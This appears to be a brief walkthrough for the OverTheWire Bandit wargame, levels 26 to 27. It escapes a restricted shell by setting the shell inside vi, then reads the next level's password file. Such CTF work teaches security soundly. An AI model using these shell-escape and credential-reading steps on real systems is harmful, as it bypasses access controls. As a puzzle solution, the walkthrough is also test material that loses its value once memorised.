Level 26 → Level 27
// username: bandit26
ssh bandit26@bandit.labs.overthewire.org -p 2220

// enter password for level 26

ls                   //lists files (restricted shell opens)

vi                    //opens the vi editor

:set shell=/bin/bash              //changes the default shell inside vi

:shell                             //escapes restricted shell and opens bash

cat /etc/bandit_pass/bandit27                      //reads the password file

exit

password of next level (bandit27) is displayed
